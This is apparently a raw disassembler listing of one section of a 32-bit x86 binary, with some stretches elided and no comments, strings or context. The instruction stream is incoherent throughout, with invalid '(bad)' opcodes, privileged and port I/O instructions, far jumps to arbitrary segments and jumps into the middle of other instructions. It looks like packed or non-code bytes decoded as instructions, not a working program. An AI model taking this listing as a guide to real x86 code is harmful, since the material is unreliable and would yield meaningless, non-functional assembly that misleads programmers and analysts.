  419499:	lea    edx,[edx+0x1b]
  41949c:	and    esp,ebp
  41949e:	pop    edx
  41949f:	mov    cl,0xdb
  4194a1:	xor    DWORD PTR [eax-0xcbf420e],ecx
  4194a7:	and    al,0x5c
  4194a9:	or     bl,BYTE PTR [edi+ebx*4]
  4194ac:	or     al,0x4a
  4194ae:	jg     0x41943d
  4194b0:	mov    ebp,0xc979a992
  4194b5:	inc    ebp
  4194b6:	push   ecx
  4194b7:	xchg   esi,eax
  4194b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b9:	push   cs
  4194ba:	adc    ebp,eax
  4194bc:	int    0x33
  4194be:	in     al,0x56
  4194c0:	fmul   QWORD PTR [edi+0x1b2a077d]
  4194c6:	xor    BYTE PTR [ebx+0x6255c7a4],bh
  4194cc:	cdq    
  4194cd:	rol    DWORD PTR [esi+eiz*8+0x62],cl
  4194d1:	sbb    ch,BYTE PTR [ebp+0xb6a622e]
  4194d7:	imul   esi,DWORD PTR [ebx+0x5cf4675c],0xb5bb4d20
  4194e1:	dec    esp
  4194e2:	add    dl,BYTE PTR [ecx+0x593cebc8]
  4194e8:	mov    eax,0x1e804fee
  4194ed:	add    DWORD PTR [eax+edi*2-0x27],esi
  4194f1:	and    ch,al
  4194f3:	push   esp
  4194f4:	cdq    
  4194f5:	dec    eax
  4194f6:	clc    
  4194f7:	mov    esp,0xa291e80e
  4194fc:	cmp    al,0x7
  4194fe:	ss push es
  419500:	push   ds
  419501:	push   ds
  419502:	(bad)  
  419503:	aam    0x8c
  419505:	sahf   
  419506:	(bad)  
  419507:	call   0x66d937bb
  41950c:	cwde   
  41950d:	jbe    0x4194b7
  41950f:	cdq    
  419510:	pop    ebx
  419511:	inc    eax
  419512:	(bad)  
  419513:	adc    al,ah
  419515:	sahf   
  419516:	push   ebp
  419517:	cld    
  419518:	mov    bl,0x14
  41951a:	mov    edx,DWORD PTR [ecx+0x2002a6c]
  419520:	cli    
  419521:	fld    st(7)
  419523:	sub    DWORD PTR [esi],0x8e262de8
  419529:	adc    BYTE PTR [ebp+0x16107bde],0x99
  419530:	and    eax,0xb2d4a488
	...
  419595:	add    BYTE PTR [edi-0x9d722c],ch
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	div    BYTE PTR [edi]
  4195a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195a4:	lea    eax,[edi+0x10a83]
  4195aa:	pop    es
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [ebx+0x22],ah
  4195b0:	addr16 pop ecx
  4195b2:	or     al,0xa2
  4195b4:	int    0x7d
  4195b6:	mov    bl,0xc1
  4195b8:	js     0x4195c2
  4195ba:	dec    ebp
  4195bb:	add    dl,BYTE PTR [edx-0x5c24673]
  4195c1:	mov    dh,0x2e
  4195c3:	sahf   
  4195c4:	ds push ds
  4195c6:	xchg   ecx,eax
  4195c7:	imul   edx,esi,0xc5393c70
  4195cd:	mov    eax,0x1303dd53
  4195d2:	mov    esp,0x61b0ce34
  4195d7:	jmp    0xb3ca:0x278e652b
  4195de:	repnz and DWORD PTR [ebx+0x69f3cdc6],edi
  4195e5:	in     al,dx
  4195e6:	loope  0x41961a
  4195e8:	jecxz  0x41962c
  4195ea:	mov    bh,0x4a
  4195ec:	lea    eax,[edi]
  4195ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f0:	jp     0x419600
  4195f2:	test   BYTE PTR [ecx-0x74a0beb2],dh
  4195f8:	lods   al,BYTE PTR ds:[esi]
  4195f9:	mov    ecx,0x8ae0dc80
  4195fe:	lea    esp,[ecx]
  419600:	pop    ds
  419601:	cmp    DWORD PTR ds:0xcab6836d,ebp
  419607:	ror    DWORD PTR [ebp+eax*4+0x6e],1
  41960b:	pop    ss
  41960c:	aad    0x60
  41960e:	jmp    0xca2e:0x8f5d93be
  419615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419616:	adc    BYTE PTR [ebx+0x699ad328],bl
  41961c:	mov    bh,0x40
  41961e:	inc    ecx
  41961f:	in     al,dx
  419620:	std    
  419621:	xchg   esp,eax
  419622:	fstp   QWORD PTR [ebx]
  419624:	scas   al,BYTE PTR es:[edi]
  419625:	stos   BYTE PTR es:[edi],al
  419626:	stos   DWORD PTR es:[edi],eax
  419627:	sub    ecx,ebx
  419629:	mov    dh,0x70
  41962b:	pop    ebx
  41962c:	dec    eax
  41962d:	cli    
  41962e:	cli    
  41962f:	mov    bh,0x57
  419631:	jnp    0x41964c
  419633:	in     eax,0xd1
  419635:	es mov dl,0x8d
  419638:	lods   eax,DWORD PTR ds:[esi]
  419639:	mov    DWORD PTR [ebx],eax
  41963b:	cwde   
  41963c:	mov    ebx,esp
  41963e:	mov    eax,0xca47ba7c
  419643:	adc    bh,BYTE PTR [edi]
  419645:	sub    eax,0x165353b5
  41964a:	jmp    0x2346:0x6c4c0e8f
  419651:	dec    DWORD PTR [eax+ebx*2]
  419654:	add    eax,0xd7f8e679
  419659:	pop    edx
  41965a:	xor    eax,ebp
  41965c:	test   BYTE PTR fs:[ebp+0x62],bl
  419660:	test   DWORD PTR [edi-0x263685b7],0x2bd19e98
  41966a:	mov    dl,0x64
  41966c:	sub    BYTE PTR [edi-0x478cc316],0xb4
  419673:	rcr    BYTE PTR ds:0x9e1ce60a,0xe1
  41967a:	scas   eax,DWORD PTR es:[edi]
  41967b:	in     al,0xc9
  41967d:	mov    ebp,0x9b3153ef
  419682:	add    BYTE PTR [eax+0x9],ah
  419685:	pop    ds
  419686:	ja     0x41960f
  419688:	pushf  
  419689:	aam    0x9e
  41968b:	out    0x6f,eax
  41968d:	adc    eax,0x9e48d6f4
  419692:	mov    ebx,0x5b0b10e3
  419697:	add    al,ah
  419699:	loopne 0x4196fe
  41969b:	jl     0x419699
  41969d:	mov    dl,0x3c
  41969f:	jmp    0x4bc68a48
  4196a4:	pop    esp
  4196a5:	sub    eax,0x986befc6
  4196aa:	mov    ch,BYTE PTR [ebx-0x6f]
  4196ad:	rol    BYTE PTR [edx],1
  4196af:	enter  0x4aa0,0xde
  4196b3:	push   ebx
  4196b4:	xchg   DWORD PTR [eax],eax
	...
  419716:	mov    bl,0x3f
  419718:	jno    0x41977f
  41971a:	std    
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	sub    eax,0x8a014c56
  419727:	or     eax,DWORD PTR [ecx]
  419729:	add    BYTE PTR [edi],al
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [esi],dh
  41972f:	push   0xffffffa0
  419731:	jle    0x419797
  419733:	fidivr WORD PTR [esi-0x42379274]
  419739:	pop    ds
  41973a:	sub    DWORD PTR [ecx+edi*8+0x4f],ecx
  41973e:	mov    edx,0x9377aede
  419743:	xor    BYTE PTR ds:0x75781570,0x3a
  41974a:	retf   
  41974b:	mov    al,0x96
  41974d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41974e:	and    esp,DWORD PTR [edi+0x5a]
  419751:	stos   BYTE PTR es:[edi],al
  419752:	jbe    0x419756
  419754:	mov    al,ds:0x43caa52c
  419759:	fnsave [esi-0x41]
  41975c:	dec    ecx
  41975d:	lahf   
  41975e:	sbb    edi,DWORD PTR [edi]
  419760:	inc    edx
  419761:	scas   al,BYTE PTR es:[edi]
  419762:	call   0xc99d8348
  419767:	fsubr  DWORD PTR [eax+eiz*2-0x3279e446]
  41976e:	pusha  
  41976f:	lock jmp 0xe1e41ac7
  419775:	and    edx,DWORD PTR [ebx+0x7b063164]
  41977b:	xor    BYTE PTR [eax-0x34],al
  41977e:	stos   BYTE PTR es:[edi],al
  41977f:	lods   al,BYTE PTR ds:[esi]
  419780:	inc    ebx
  419781:	dec    edx
  419782:	cmc    
  419783:	jmp    0x419747
  419785:	push   esi
  419786:	mov    edi,0xf264db6e
  41978b:	mov    ds:0x37fbddec,eax
  419790:	push   ebx
  419791:	into   
  419792:	or     BYTE PTR [edi-0x10eeb0ca],ch
  419798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419799:	mov    dl,0xac
  41979b:	or     esp,eax
  41979d:	imul   BYTE PTR [edi]
  41979f:	mov    al,0x97
  4197a1:	xchg   esp,eax
  4197a2:	int3   
  4197a3:	xor    BYTE PTR [edx-0x2c96e1d7],bl
  4197a9:	dec    edi
  4197aa:	sbb    BYTE PTR [ebx+eax*4+0x5c],dh
  4197ae:	call   0x4310:0x31d0df57
  4197b5:	loopne 0x4197a3
  4197b7:	sub    DWORD PTR [ecx+edi*4+0xa],esi
  4197bb:	outs   dx,BYTE PTR ds:[esi]
  4197bc:	outs   dx,BYTE PTR ds:[esi]
  4197bd:	les    esi,FWORD PTR [ecx+ebp*2-0x6cfe79b8]
  4197c4:	xor    ecx,DWORD PTR [esi-0xe5be2c5]
  4197ca:	pushf  
  4197cb:	ins    BYTE PTR es:[edi],dx
  4197cc:	std    
  4197cd:	sub    esp,DWORD PTR [edx]
  4197cf:	mov    ecx,0xa97f257d
  4197d4:	push   ecx
  4197d5:	enter  0xd32e,0x2a
  4197d9:	sbb    al,0xdf
  4197db:	and    eax,0xe3b35885
  4197e0:	xor    eax,0x456f7879
  4197e5:	jmp    0x4197d3
  4197e7:	out    0xae,eax
  4197e9:	mov    esi,0x7f57eef9
  4197ee:	adc    DWORD PTR [edi+0x5951b507],ebx
  4197f4:	(bad)  
  4197f5:	add    DWORD PTR [eax+0x67],edi
  4197f8:	(bad)
  4197fb:	mov    ch,0xb1
  4197fd:	ds stc 
  4197ff:	mov    esp,0xb1570f1a
  419804:	pushf  
  419805:	mov    edi,0xa5b67bf8
  41980a:	mov    ch,0x95
  41980c:	arpl   WORD PTR [esi+0x5d],bx
  41980f:	lock and BYTE PTR [esi],bl
  419812:	push   0xc60bf7d0
  419817:	leave  
  419818:	and    ebp,DWORD PTR [esp+ecx*8+0x347d55c6]
  41981f:	inc    esp
  419820:	popf   
  419821:	inc    ebx
  419822:	add    esi,DWORD PTR [ebx-0x18]
  419825:	sbb    DWORD PTR [eax+0x29c1d9a7],edi
  41982b:	or     BYTE PTR [edx-0x4e74bcd0],dl
  419831:	jno    0x419826
  419833:	loopne 0x4198a7
	...
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fisubr DWORD PTR [edx]
  4198a3:	mov    ds:0xc910901,eax
  4198a8:	add    DWORD PTR [eax],eax
  4198aa:	pop    es
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    bh,ch
  4198af:	jmp    0x41989d
  4198b1:	ror    BYTE PTR [edi-0x76],1
  4198b4:	mov    dl,dh
  4198b6:	xchg   esi,eax
  4198b7:	fidivr DWORD PTR [edx-0x2e]
  4198ba:	cmp    al,0x9b
  4198bc:	xor    ecx,ebx
  4198be:	imul   edi,DWORD PTR [edx],0xd061581b
  4198c4:	in     eax,dx
  4198c5:	xor    DWORD PTR [eax+0xb8c982a],ecx
  4198cb:	jge    0x41985e
  4198cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198ce:	xor    ah,ch
  4198d0:	push   cs
  4198d1:	and    BYTE PTR [edi-0x3b937f16],dl
  4198d7:	xchg   bh,ah
  4198d9:	push   ecx
  4198da:	jmp    0x2a8b1f57
  4198df:	inc    ebx
  4198e0:	int3   
  4198e1:	add    ecx,edi
  4198e3:	fnsave [ecx-0x48]
  4198e6:	fwait
  4198e7:	lea    esi,[ebx]
  4198e9:	mov    dh,0xc7
  4198eb:	xor    bl,BYTE PTR [ecx]
  4198ed:	cmp    bl,BYTE PTR [eax]
  4198ef:	call   esi
  4198f1:	mov    ebp,es
  4198f3:	into   
  4198f4:	add    eax,0x2bb0021f
  4198f9:	fisttp WORD PTR [esi+eiz*2-0x1]
  4198fd:	dec    eax
  4198fe:	div    DWORD PTR [esi]
  419900:	shr    BYTE PTR [esi+0x3d25883c],1
  419906:	retf   0xbab0
  419909:	ret    
  41990a:	lea    ecx,[ebp+0x37777f2a]
  419910:	in     al,dx
  419911:	les    esp,FWORD PTR [edi-0x48898f7c]
  419917:	mov    WORD PTR [ecx+0x18],ds
  41991a:	pop    edi
  41991b:	lea    esi,[edx+edx*2-0x2be953cd]
  419922:	jp     0x4198ac
  419924:	push   esp
  419925:	jmp    0x41993b
  419927:	ds jmp 0x419933
  41992a:	fild   WORD PTR [ecx+0x32]
  41992d:	aad    0x48
  41992f:	cwde   
  419930:	jne    0x419942
  419932:	adc    BYTE PTR [eax],dl
  419934:	out    0x6e,eax
  419936:	sub    esi,DWORD PTR [ebp-0xae9868b]
  41993c:	and    al,0x9b
  41993e:	out    dx,eax
  41993f:	push   ecx
  419940:	lea    edx,[ebx]
  419942:	pop    es
  419943:	push   eax
  419944:	mov    esp,0xc87db355
  419949:	cmp    eax,0x74d1ef7d
  41994e:	retf   
  41994f:	vmread edi,eax
  419952:	xchg   ecx,eax
  419953:	cmp    eax,ecx
  419955:	or     BYTE PTR [edx+0xb0e7f31],0xeb
  41995c:	retf   
  41995d:	lods   eax,DWORD PTR ds:[esi]
  41995e:	jecxz  0x419979
  419960:	call   0xbae98489
  419965:	sahf   
  419966:	push   esp
  419967:	clc    
  419968:	xlat   BYTE PTR ds:[ebx]
  419969:	jg     0x419990
  41996b:	sbb    eax,ecx
  41996d:	or     dl,al
  41996f:	(bad)  
  419970:	nop
  419971:	mov    ds:0x7c282032,eax
  419976:	int3   
  419977:	or     edx,ebp
  419979:	mov    esi,0xe6d026ea
  41997e:	rcl    BYTE PTR [edi-0x4d],0x5a
  419982:	jmp    0xed6e:0xa8d8de27
  419989:	push   ebp
  41998a:	scas   al,BYTE PTR es:[edi]
  41998b:	lea    esi,[esi+edi*2+0x0]
  41998f:	jmp    0x9343:0xff4cbc96
  419996:	loopne 0x4199dd
  419998:	pop    esp
  41999a:	fldenv [ecx+0x4]
  41999d:	jl     0x41999c
  41999f:	ret    0x34ec
  4199a2:	pushf  
  4199a3:	sub    eax,edi
  4199a5:	jno    0x4199ff
  4199a7:	inc    ebp
  4199a8:	inc    eax
  4199a9:	mov    edi,0x8a60b430
  4199ae:	xlat   BYTE PTR ds:[ebx]
  4199af:	popf   
  4199b0:	and    ecx,0xdd5591
	...
  419a16:	xor    esi,DWORD PTR [ecx]
  419a18:	xchg   ebx,eax
  419a19:	lds    edx,FWORD PTR [ebx+0x59f777e7]
  419a1f:	push   ss
  419a20:	mov    eax,ds:0x8fce1309
  419a25:	aas    
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	push   edx
  419a2f:	pop    esi
  419a30:	jg     0x4199ed
  419a32:	mov    esi,0x291f86cc
  419a37:	das    
  419a38:	out    0xdf,eax
  419a3a:	sbb    eax,0xa3870e3e
  419a3f:	nop
  419a40:	adc    al,0x99
  419a42:	imul   ch
  419a44:	out    dx,al
  419a45:	daa    
  419a46:	fdiv   QWORD PTR [ecx-0x4f]
  419a49:	and    al,0x82
  419a4b:	js     0x419a4a
  419a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a4e:	repnz in eax,dx
  419a50:	icebp  
  419a51:	adc    bl,BYTE PTR [esi+0x44]
  419a54:	sahf   
  419a55:	fisttp DWORD PTR [ebx+eiz*4+0x477f10c7]
  419a5c:	push   cs
  419a5d:	xor    esi,ebp
  419a5f:	fwait
  419a60:	repnz push cs
  419a62:	and    cl,ah
  419a64:	lods   eax,DWORD PTR ds:[esi]
  419a65:	outs   dx,DWORD PTR ds:[esi]
  419a66:	outs   dx,BYTE PTR ds:[esi]
  419a67:	push   edi
  419a68:	pop    ss
  419a69:	and    eax,0x3bf785c6
  419a6e:	cmp    eax,0xeac473d0
  419a73:	stc    
  419a74:	out    0x3,al
  419a76:	iret   
  419a77:	je     0x2d6c0852
  419a7d:	sbb    dh,BYTE PTR fs:[eax]
  419a80:	data16 jo 0x419afd
  419a83:	clc    
  419a84:	add    bl,BYTE PTR [ecx-0x32]
  419a87:	fisttp DWORD PTR [edx]
  419a89:	inc    ecx
  419a8a:	bound  ebx,QWORD PTR [edx+0x71b311f5]
  419a90:	clc    
  419a91:	int3   
  419a92:	inc    edx
  419a93:	xor    al,0xe5
  419a95:	call   0x987f7ce6
  419a9a:	sahf   
  419a9b:	xchg   BYTE PTR ds:0x2304dc43,ah
  419aa2:	mov    ebx,0x7c9e620a
  419aa7:	mov    ebx,0x5b7e2bc3
  419aac:	rcr    BYTE PTR [edx],1
  419aae:	popa   
  419aaf:	out    dx,al
  419ab0:	push   esp
  419ab1:	fiadd  WORD PTR [edi-0x1dfc93ad]
  419ab7:	mov    cl,BYTE PTR [ebp+0x6526fbae]
  419abd:	xchg   ebp,eax
  419abe:	mov    ecx,0x157e8716
  419ac3:	sub    BYTE PTR [ebx],ah
  419ac5:	jg     0x419ac0
  419ac7:	arpl   WORD PTR [ecx+0x49b79167],dx
  419acd:	mov    edi,0xd0b5bf07
  419ad2:	mov    ecx,0x67a6457
  419ad7:	rol    DWORD PTR [eax+0x79],0xd0
  419adb:	jmp    0x66d9c922
  419ae0:	aad    0xaa
  419ae2:	push   ebp
  419ae3:	nop
  419ae4:	dec    ecx
  419ae5:	pop    edx
  419ae6:	(bad)  
  419ae7:	mov    edi,0x89d1b378
  419aec:	les    esi,FWORD PTR [ecx-0x72]
  419aef:	and    al,0xfe
  419af1:	add    edi,DWORD PTR [ebp-0x6a]
  419af4:	or     DWORD PTR [eax],esp
  419af6:	addr16 jo 0x419b25
  419af9:	adc    cl,BYTE PTR [ebx]
  419afb:	ins    BYTE PTR es:[edi],dx
  419afc:	in     eax,0x37
  419afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aff:	cs sub ebx,esi
  419b02:	pop    ebx
  419b03:	in     al,dx
  419b04:	inc    ecx
  419b05:	fsubr  QWORD PTR [esp+ebx*2]
  419b08:	or     DWORD PTR [ecx+0x23],ebp
  419b0b:	dec    ebx
  419b0c:	mov    bl,0x24
  419b0e:	ficomp DWORD PTR [eax]
  419b10:	fcomp  QWORD PTR [eax+0x68e4904]
  419b16:	or     ebx,edx
  419b18:	adc    edx,edx
  419b1a:	ret    0x7934
  419b1d:	daa    
  419b1e:	shl    BYTE PTR [ebp+0x74],0x8e
  419b22:	call   0x9dc3:0xbfab734f
  419b29:	cmp    BYTE PTR [edx-0x102c7fb5],0xe0
  419b30:	adc    edx,edi
  419b32:	test   BYTE PTR [ebp+0x5c],cl
	...
  419b95:	add    BYTE PTR [edx-0x3c],cl
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	hlt    
  419ba3:	xchg   ebx,eax
  419ba4:	jnp    0x419bd3
  419ba6:	lahf   
  419ba7:	push   cs
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [edi+0x7b6310d0],bh
  419bb3:	push   ebp
  419bb4:	and    esi,ebp
  419bb6:	and    al,0x7
  419bb8:	xchg   esi,eax
  419bb9:	mov    bl,0x91
  419bbb:	cmp    BYTE PTR [eax-0x7e11719],0x99
  419bc2:	scas   al,BYTE PTR es:[edi]
  419bc3:	push   ss
  419bc4:	pop    ds
  419bc5:	mov    ecx,0x9bebad87
  419bca:	xchg   ebp,eax
  419bcb:	ss pop eax
  419bcd:	jns    0x419b98
  419bcf:	ja     0x419bd7
  419bd1:	jbe    0x419c31
  419bd3:	scas   al,BYTE PTR es:[edi]
  419bd4:	add    eax,0x3af95de5
  419bd9:	and    BYTE PTR [ebx+0x9],ah
  419bdc:	pop    DWORD PTR [eax-0x4d]
  419bdf:	loopne 0x419c17
  419be1:	mov    ebp,DWORD PTR [ecx]
  419be3:	sbb    BYTE PTR [edi],0x25
  419be6:	fnstcw WORD PTR [ebx-0x18]
  419be9:	data16 mov BYTE PTR [eax],bh
  419bec:	popa   
  419bed:	pop    edx
  419bee:	sbb    DWORD PTR [edi+0x73],esi
  419bf1:	clc    
  419bf2:	and    al,0x75
  419bf4:	popa   
  419bf5:	cld    
  419bf6:	cmp    DWORD PTR [ecx],eax
  419bf8:	and    ebp,ebx
  419bfa:	dec    esi
  419bfb:	dec    edx
  419bfc:	sub    edi,DWORD PTR [eax]
  419bfe:	xchg   esi,eax
  419bff:	fwait
  419c00:	pop    ebx
  419c01:	add    bl,dh
  419c03:	sar    BYTE PTR [esp+ecx*8+0xf],cl
  419c07:	aas    
  419c08:	adc    BYTE PTR [ebx],bh
  419c0a:	add    eax,0x5cb75d4f
  419c0f:	dec    edi
  419c10:	or     al,0xca
  419c12:	test   BYTE PTR [edi+edi*2],bl
  419c15:	je     0x419c4a
  419c17:	shl    BYTE PTR [ecx+0x122db29],1
  419c1d:	pop    ecx
  419c1e:	cmp    DWORD PTR [ebx],esi
  419c20:	aaa    
  419c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c22:	rcr    BYTE PTR ds:0xfca5ce83,1
  419c28:	ins    DWORD PTR es:[edi],dx
  419c29:	addr16 addr16 jmp 0x6ca:0xefb1e190
  419c32:	or     esp,DWORD PTR [esi]
  419c34:	iret   
  419c35:	sar    DWORD PTR [edx+edi*1+0x30],0xe4
  419c3a:	mov    es,WORD PTR [edx]
  419c3c:	scas   eax,DWORD PTR es:[edi]
  419c3d:	sti    
  419c3e:	add    bl,dh
  419c40:	pop    ebx
  419c41:	lods   al,BYTE PTR ds:[esi]
  419c42:	aaa    
  419c43:	adc    al,BYTE PTR [ecx-0x562dc6e8]
  419c49:	aas    
  419c4a:	and    dh,ah
  419c4c:	mov    ds:0x9a41e2ed,eax
  419c51:	push   0xbff195d2
  419c56:	daa    
  419c57:	jns    0x419c63
  419c59:	lock push ecx
  419c5b:	js     0x419caf
  419c5d:	xchg   DWORD PTR [ebx],ebx
  419c5f:	pushf  
  419c60:	imul   esi,DWORD PTR [esi-0x7dfa805d],0xe6545cdf
  419c6a:	mov    bl,0x22
  419c6c:	cmc    
  419c6d:	cs pop es
  419c6f:	xor    bh,dl
  419c71:	fisttp QWORD PTR [eiz*8-0x1def9c9e]
  419c78:	shl    ch,0xf7
  419c7b:	push   ecx
  419c7c:	xchg   ebp,eax
  419c7d:	mov    ecx,0xe1b8e271
  419c82:	push   cs
  419c83:	xchg   edx,eax
  419c84:	mov    al,ds:0xd2bd506c
  419c89:	ja     0x419c10
  419c8b:	adc    ah,BYTE PTR [edi+0x20]
  419c8e:	loop   0x419ce7
  419c90:	jmp    0x945e:0x55986b01
  419c97:	das    
  419c98:	ja     0x419c57
  419c9a:	pop    esi
  419c9b:	sbb    BYTE PTR [esi],ah
  419c9d:	mov    esi,0x8c7ab965
  419ca2:	cmc    
  419ca3:	lahf   
  419ca4:	les    ecx,FWORD PTR [eax]
  419ca6:	in     eax,0xe2
  419ca8:	add    eax,0x6b22b866
  419cad:	mov    eax,ds:0xf9fa0d81
  419cb2:	mov    ecx,0x32bc
	...
  419d13:	add    BYTE PTR [eax],al
  419d15:	add    al,dh
  419d17:	xchg   edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0x78489c45
  419d24:	sub    al,0x58
  419d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d27:	sgdtd  [eax]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [edi+0x61a17449],al
  419d33:	xor    al,BYTE PTR [edi+0x50936594]
  419d39:	adc    eax,0xd1a8870f
  419d3e:	mov    ebp,0xb8ca81a6
  419d43:	xchg   BYTE PTR [ebx+0x61150e1e],dh
  419d49:	call   0x2afb:0x6dea7f5b
  419d50:	sbb    bh,BYTE PTR [esi-0xa081b02]
  419d56:	mov    ecx,0xf928e761
  419d5b:	push   0x46
  419d5d:	lea    esi,[ecx+0x30c7de5a]
  419d63:	outs   dx,DWORD PTR ds:[esi]
  419d64:	daa    
  419d65:	fs adc ebp,edi
  419d68:	mov    ecx,0x94c4fd3e
  419d6d:	loope  0x419cf1
  419d6f:	push   DWORD PTR [ebx]
  419d71:	or     ebx,DWORD PTR [edi-0x17]
  419d74:	pop    esi
  419d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d76:	cmp    al,0x9a
  419d78:	fcomi  st,st(7)
  419d7a:	int    0x2f
  419d7c:	add    BYTE PTR [edx],bl
  419d7e:	mov    BYTE PTR [ecx+0x20],ah
  419d81:	pop    ss
  419d82:	inc    edx
  419d83:	pop    edx
  419d84:	call   0x79255200
  419d89:	aas    
  419d8a:	jle    0x419d7c
  419d8c:	mov    bh,BYTE PTR [ecx]
  419d8e:	inc    edi
  419d8f:	push   esp
  419d90:	push   ebp
  419d91:	sti    
  419d92:	mov    ch,0x3c
  419d94:	(bad)  
  419d95:	test   eax,0x8c5628d5
  419d9a:	cld    
  419d9b:	adc    bh,BYTE PTR [eax-0x2ddb2059]
  419da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da2:	mov    ch,0x75
  419da4:	jl     0x419def
  419da6:	jmp    0xa26e:0xe4e19936
  419dad:	pop    es
  419dae:	lock (bad) 
  419db0:	xor    al,0x5d
  419db2:	outs   dx,BYTE PTR ds:[esi]
  419db3:	rcl    BYTE PTR [eax],0xb5
  419db6:	jge    0x419df5
  419db8:	loop   0x419dda
  419dba:	into   
  419dbb:	or     ebp,DWORD PTR [edi]
  419dbd:	jmp    0x1bdc:0xa992d7d
  419dc4:	aas    
  419dc5:	mov    WORD PTR [edi],cs
  419dc7:	ins    DWORD PTR es:[edi],dx
  419dc8:	(bad)  
  419dc9:	cwde   
  419dca:	inc    edx
  419dcb:	nop
  419dcc:	std    
  419dcd:	ja     0x419e00
  419dcf:	popf   
  419dd0:	jle    0x419e39
  419dd2:	fwait
  419dd3:	xor    al,BYTE PTR [edi-0x7384c4f8]
  419dd9:	out    0x10,eax
  419ddb:	mov    bl,BYTE PTR [esi]
  419ddd:	jmp    0x419d66
  419ddf:	cmp    cl,ch
  419de1:	jne    0x419e5a
  419de3:	shr    BYTE PTR [ecx],0xf8
  419de6:	cmp    eax,0x62c27083
  419deb:	jb     0x419dc5
  419ded:	loop   0x419e3c
  419def:	dec    ebx
  419df0:	sbb    esi,esp
  419df2:	or     esi,DWORD PTR [edx-0x4803bf56]
  419df8:	loop   0x419df8
  419dfa:	push   cs
  419dfb:	in     eax,0xb2
  419dfd:	lds    esi,FWORD PTR [ebx+0x54]
  419e00:	clc    
  419e01:	fisub  WORD PTR [edi+edi*2-0x693a7324]
  419e08:	inc    ebx
  419e09:	(bad)  
  419e0a:	sub    edi,DWORD PTR [edx+ebp*2-0x208843d4]
  419e11:	and    BYTE PTR [ebx+0x1c57a73f],0x66
  419e18:	add    eax,0x4f5d4c6f
  419e1d:	inc    eax
  419e1e:	sahf   
  419e1f:	xchg   ebx,eax
  419e20:	out    dx,al
  419e21:	sbb    dl,BYTE PTR [ebx-0x2347b7ec]
  419e27:	push   es
  419e28:	inc    ebx
  419e29:	mov    al,0xc
  419e2b:	pop    esp
  419e2c:	sub    eax,0xb163a624
  419e31:	push   ebx
  419e32:	mov    ebp,0x8b
	...
  419e94:	add    BYTE PTR [eax],al
  419e96:	xchg   eax,ebx
  419e98:	pop    ss
  419e99:	lds    ebx,FWORD PTR [edi-0x31]
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax-0x77af3a60]
  419ea3:	jo     0x419e4a
  419ea5:	shr    BYTE PTR [ebp+0x7000110],cl
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    dh,ah
  419eaf:	push   0x5176052
  419eb4:	jle    0x419f15
  419eb6:	mov    esi,0xdb8887dc
  419ebb:	and    bl,BYTE PTR [ebx-0x7a041996]
  419ec1:	jl     0x419eef
  419ec3:	adc    ebx,esi
  419ec5:	bound  edx,QWORD PTR [ebp+ebx*4+0xe720a4]
  419ecc:	sub    DWORD PTR [esi],ecx
  419ece:	add    al,0x8b
  419ed0:	adc    ah,cl
  419ed2:	xor    edi,DWORD PTR [edi-0x17]
  419ed5:	das    
  419ed6:	mov    gs,WORD PTR [edi+ebp*1]
  419ed9:	scas   al,BYTE PTR es:[edi]
  419eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419edb:	in     eax,dx
  419edc:	imul   edx,DWORD PTR [edx-0x5a],0xffffffcc
  419ee0:	repz push 0x5f
  419ee3:	inc    ecx
  419ee4:	(bad)  
  419ee5:	jbe    0x419e80
  419ee7:	xchg   esp,eax
  419ee8:	inc    eax
  419ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eea:	stc    
  419eeb:	inc    ecx
  419eec:	idiv   BYTE PTR [ebx]
  419eee:	add    DWORD PTR [edx-0x4ab0dff1],esi
  419ef4:	pop    ds
  419ef5:	test   BYTE PTR [edx*2-0x3a8dcb96],dh
  419efc:	or     eax,0x73825648
  419f01:	xchg   ecx,eax
  419f02:	stos   DWORD PTR es:[edi],eax
  419f03:	jmp    0x1d23702c
  419f08:	loope  0x419eb5
  419f0a:	cli    
  419f0b:	push   edi
  419f0c:	dec    esi
  419f0d:	add    eax,DWORD PTR [edi+0x3a]
  419f10:	adc    BYTE PTR [esi-0x7a],al
